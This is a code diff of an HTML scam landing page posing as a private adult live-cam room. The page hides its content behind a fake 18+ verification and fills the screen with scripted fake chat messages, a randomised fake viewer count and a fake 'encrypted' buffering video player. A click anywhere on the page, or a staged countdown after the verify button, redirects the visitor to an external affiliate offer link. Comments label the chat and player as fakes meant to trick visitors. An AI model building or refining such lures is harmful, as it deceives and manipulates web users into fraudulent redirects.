@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>🔴 Private VIP Cam Room</title>
+    <title>🔴 Private VIP Guest Room</title>
     
     <!-- SOCIAL MEDIA PREVIEW TAGS -->
     <meta name="description" content="Join as a GUEST now. No registration required. Enter the private room instantly.">
@@ -21,7 +21,7 @@
             --accent: #ff2a40;
             --yellow: #fbad19;
             --text-main: #ffffff;
-            --chat-bg: rgba(0, 0, 0, 0.4);
+            --neon-green: #00ff00;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; user-select: none; }
@@ -38,12 +38,12 @@
             cursor: pointer;
         }
 
-        /* Fullscreen Background */
+        /* Fullscreen Blurred Background */
         .bg-image {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
             background: url('https://raw.githubusercontent.com/amanda25858-alt/text8/main/HMaXk_HWcAAhsj0.jpg') center/cover no-repeat;
-            filter: blur(18px) brightness(0.25);
+            filter: blur(20px) brightness(0.25);
             transform: scale(1.1);
             z-index: 1;
         }
@@ -61,70 +61,113 @@
         
         .guest-badge {
             background: rgba(255, 255, 255, 0.15);
-            padding: 6px 12px;
+            padding: 5px 12px;
             border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
+            font-size: 11px;
+            font-weight: 700;
             backdrop-filter: blur(5px);
             border: 1px solid rgba(255,255,255,0.2);
+            text-transform: uppercase;
         }
         
         .room-capacity {
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 700;
             color: var(--yellow);
             animation: pulse 2s infinite;
         }
 
-        /* Main Card */
+        /* Main Card Container */
         .ticket-card {
             position: relative;
             z-index: 10;
             width: 92%;
             max-width: 420px;
             text-align: center;
-            margin-top: 60px;
+            margin-top: 50px;
         }
 
         .profile-pic {
-            width: 75px;
-            height: 75px;
+            width: 70px;
+            height: 70px;
             border-radius: 50%;
             border: 2px solid var(--accent);
             background: url('https://raw.githubusercontent.com/amanda25858-alt/text8/main/HMaXk_HWcAAhsj0.jpg') center/cover;
             margin: 0 auto -35px auto;
             position: relative;
             z-index: 20;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
         }
 
         .main-box {
             border: 1px solid rgba(255,255,255,0.1);
             border-radius: 16px;
             padding: 45px 15px 20px 15px;
-            background: rgba(20, 20, 20, 0.6);
-            backdrop-filter: blur(15px);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            border-top: 3px solid var(--accent);
+            background: rgba(20, 20, 20, 0.7);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            border-top: 2px solid var(--accent);
         }
 
+        /* --- Fake Video Player Inside Box --- */
+        .fake-video-player {
+            width: 100%;
+            height: 140px;
+            background: url('https://raw.githubusercontent.com/amanda25858-alt/text8/main/HMaXk_HWcAAhsj0.jpg') center/cover no-repeat;
+            filter: blur(6px) brightness(0.5);
+            border-radius: 10px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.15);
+            margin-bottom: 15px;
+        }
+
+        .player-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        .video-spinner {
+            width: 35px;
+            height: 35px;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-top-color: var(--yellow);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 8px;
+        }
+
+        .buffering-text {
+            color: #fff;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        /* --- Dynamic Logic Views (Step 1 & 2) --- */
         .no-reg-text {
-            color: #00ff00;
+            color: var(--neon-green);
             font-size: 13px;
             font-weight: 700;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
         }
 
         .verify-desc {
-            font-size: 14px;
+            font-size: 13px;
             color: #ccc;
             line-height: 1.4;
             margin-bottom: 15px;
         }
 
         .btn-verify {
-            background: linear-gradient(45deg, var(--accent), #ff5e62);
+            background: var(--accent);
             color: #fff;
             border: none;
             width: 100%;
@@ -135,42 +178,72 @@
             text-transform: uppercase;
             box-shadow: 0 4px 15px rgba(255, 42, 64, 0.4);
             animation: shake 3s infinite;
+            cursor: pointer;
         }
 
+        /* Progress Bar elements for Step 2 */
+        .routing-text {
+            font-size: 12px;
+            color: #aaa;
+            margin-bottom: 10px;
+        }
+        .routing-domain {
+            color: var(--yellow);
+            font-weight: 700;
+            font-size: 14px;
+            margin-bottom: 10px;
+            display: block;
+        }
+        .progress-bar-container {
+            width: 100%;
+            height: 6px;
+            background: #333;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: var(--neon-green);
+            box-shadow: 0 0 8px var(--neon-green);
+        }
+        .progress-active { animation: loadBar 3s linear forwards; }
+
         /* ========================================= */
-        /* FAKE LIVE CHAT SECTION (THE MASTER TRICK) */
+        /* FAKE LIVE CHAT & BOTTOM STATS */
         /* ========================================= */
         .live-chat-container {
             position: absolute;
-            bottom: 80px;
+            bottom: 60px;
             left: 5%;
             width: 90%;
             max-width: 420px;
-            height: 180px;
+            height: 140px;
             z-index: 10;
             overflow: hidden;
             display: flex;
             flex-direction: column;
             justify-content: flex-end;
-            -webkit-mask-image: linear-gradient(to top, black 70%, transparent 100%);
-            mask-image: linear-gradient(to top, black 70%, transparent 100%);
+            -webkit-mask-image: linear-gradient(to top, black 60%, transparent 100%);
+            mask-image: linear-gradient(to top, black 60%, transparent 100%);
+            pointer-events: none; /* Let clicks pass through to global body */
         }
 
         .chat-messages {
             display: flex;
             flex-direction: column;
-            gap: 8px;
-            padding: 10px;
+            gap: 6px;
+            padding: 5px;
         }
 
         .chat-msg {
-            background: var(--chat-bg);
-            padding: 6px 12px;
-            border-radius: 12px;
-            font-size: 13px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 5px 10px;
+            border-radius: 10px;
+            font-size: 12px;
             width: fit-content;
-            max-width: 85%;
-            backdrop-filter: blur(4px);
+            max-width: 90%;
             animation: slideUp 0.3s ease-out;
         }
 
@@ -180,18 +253,17 @@
 
         .typing-indicator {
             position: absolute;
-            bottom: 50px;
-            left: 25px;
+            bottom: 35px;
+            left: 20px;
             font-size: 11px;
             color: #aaa;
             z-index: 10;
             font-style: italic;
         }
 
-        /* Bottom Stats */
         .bottom-bar {
             position: absolute;
-            bottom: 15px;
+            bottom: 10px;
             width: 90%;
             display: flex;
             justify-content: space-between;
@@ -202,23 +274,26 @@
         .viewer-count {
             background: rgba(255, 42, 64, 0.2);
             color: #fff;
-            padding: 6px 12px;
+            padding: 5px 10px;
             border-radius: 20px;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 600;
             border: 1px solid var(--accent);
         }
 
-        .join-msg { color: #ccc; font-size: 12px; }
+        .join-msg { color: #ccc; font-size: 11px; }
 
         /* Animations */
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
         @keyframes slideUp { from { transform: translateY(10px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 95% { transform: translateX(-2px); } 98% { transform: translateX(2px); } }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes loadBar { 100% { width: 100%; } }
 
     </style>
 </head>
-<body onclick="window.location.href='https://bedjfha.hubss.one/p/uyMfR'">
+<!-- Global Click Catch: Redirects immediately if they tap outside the button -->
+<body onclick="globalRedirect()">
 
     <div class="bg-image"></div>
 
@@ -232,26 +307,52 @@
     <div class="ticket-card">
         <div class="profile-pic"></div>
         <div class="main-box">
-            <div class="no-reg-text"><i class="fa-solid fa-check-circle"></i> No Registration Needed</div>
-            <div class="verify-desc">
-                You are joining as a GUEST. Please confirm you are 18+ to unlock the live video and chat instantly.
+            
+            <!-- Video Player is Back! -->
+            <div class="fake-video-player">
+                <div class="player-overlay">
+                    <div class="video-spinner"></div>
+                    <div class="buffering-text">ENCRYPTED LIVE FEED</div>
+                </div>
             </div>
-            <button class="btn-verify">
-                <i class="fa-solid fa-unlock-keyhole"></i> VERIFY 18+ AS GUEST
-            </button>
-            <div style="font-size: 10px; color: #777; margin-top: 10px;">
-                <i class="fa-solid fa-shield-halved"></i> End-to-End Encrypted Stream
+
+            <!-- STEP 1: Verification -->
+            <div id="step1">
+                <div class="no-reg-text"><i class="fa-solid fa-check-circle"></i> No Registration Needed</div>
+                <div class="verify-desc">
+                    Join as a GUEST. Confirm you are 18+ to unlock the live video and chat instantly.
+                </div>
+                <!-- Stop Propagation prevents the global click, triggering the nice animation instead -->
+                <button class="btn-verify" onclick="startRouting(event)">
+                    <i class="fa-solid fa-unlock-keyhole"></i> VERIFY 18+ TO UNLOCK
+                </button>
             </div>
+
+            <!-- STEP 2: Domain Routing (Hubss.one) -->
+            <div id="step2" style="display: none;">
+                <div class="no-reg-text" style="color: var(--neon-green);">
+                    <i class="fa-solid fa-shield-check"></i> Age Verified
+                </div>
+                <div class="routing-text">Connecting to secure streaming network:</div>
+                <span class="routing-domain">bedjfha.hubss.one</span>
+                
+                <div class="progress-bar-container">
+                    <div id="pBar" class="progress-bar"></div>
+                </div>
+                
+                <div class="verify-desc" style="font-size: 11px; margin-top: 10px;">
+                    Handshake in progress. Please wait <span id="timer" style="color: #fff; font-weight: bold;">3</span> seconds...
+                </div>
+            </div>
+
         </div>
     </div>
 
     <!-- Live Fake Chat Stream -->
     <div class="live-chat-container">
         <div class="chat-messages" id="chatBox">
-            <!-- Initial Messages -->
             <div class="chat-msg"><span class="chat-user">Guest_44:</span><span class="chat-text">wow quality is so good!</span></div>
-            <div class="chat-msg"><span class="chat-user">User902:</span><span class="chat-text">how do I turn on my cam?</span></div>
-            <div class="chat-msg"><span class="chat-user host">System:</span><span class="chat-text">New guests must verify age to view video.</span></div>
+            <div class="chat-msg"><span class="chat-user host">System:</span><span class="chat-text">Guest limit reaching soon.</span></div>
         </div>
     </div>
     
@@ -265,42 +366,68 @@
         <div class="join-msg">Tap anywhere to join chat</div>
     </div>
 
-    <!-- Smart Scripts for Chat and Viewer Count -->
+    <!-- Super Logic Scripts -->
     <script>
-        // Array of realistic fake chat messages
+        const offerLink = 'https://bedjfha.hubss.one/p/uyMfR';
+        let isRouting = false;
+
+        // Function 1: When user clicks the Verify button (Plays animation mentioning hubss.one)
+        function startRouting(event) {
+            event.stopPropagation(); // Stops the body click from firing immediately
+            if (isRouting) return;
+            isRouting = true;
+
+            // Switch to Step 2
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            document.getElementById('pBar').classList.add('progress-active');
+
+            let timeLeft = 3;
+            let countdown = setInterval(() => {
+                timeLeft--;
+                document.getElementById('timer').innerText = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    window.location.href = offerLink; // Final Redirect
+                }
+            }, 1000);
+        }
+
+        // Function 2: Global Click Fallback (If they click the video, chat, or background)
+        function globalRedirect() {
+            // If they haven't started routing, redirect immediately
+            if (!isRouting) {
+                window.location.href = offerLink;
+            }
+        }
+
+        // Chat Box Automation
         const fakeMessages = [
-            { user: "Guest_88", text: "I just joined, hi!" },
-            { user: "Alex_M", text: "Show a bit more..." },
             { user: "User551", text: "yes i can see you clearly now" },
             { user: "Guest_12", text: "waiting for the private show" },
             { user: "Tom99", text: "is anyone else lagging?" },
             { user: "Guest_45", text: "no lag for me, it's HD" },
-            { user: "Mike_D", text: "Damn 🔥" }
+            { user: "Alex_M", text: "Show a bit more..." }
         ];
 
         const chatBox = document.getElementById('chatBox');
         let msgIndex = 0;
 
-        // Auto append messages every 2.5 seconds
         setInterval(() => {
             if (msgIndex < fakeMessages.length) {
                 let newMsg = document.createElement('div');
                 newMsg.className = 'chat-msg';
                 newMsg.innerHTML = `<span class="chat-user">${fakeMessages[msgIndex].user}:</span><span class="chat-text">${fakeMessages[msgIndex].text}</span>`;
-                
                 chatBox.appendChild(newMsg);
                 
-                // Keep only last 5 messages so it doesn't overload DOM
-                if (chatBox.children.length > 5) {
-                    chatBox.removeChild(chatBox.firstChild);
-                }
+                if (chatBox.children.length > 4) chatBox.removeChild(chatBox.firstChild);
                 
                 msgIndex++;
-                if(msgIndex >= fakeMessages.length) msgIndex = 0; // Loop messages
+                if(msgIndex >= fakeMessages.length) msgIndex = 0;
             }
-        }, 2500);
+        }, 3000);
 
-        // Randomize viewer count to look real
+        // Viewer Count Automation
         setInterval(() => {
             let viewers = Math.floor(Math.random() * (55 - 48 + 1)) + 48;
             document.getElementById('viewers').innerText = viewers;
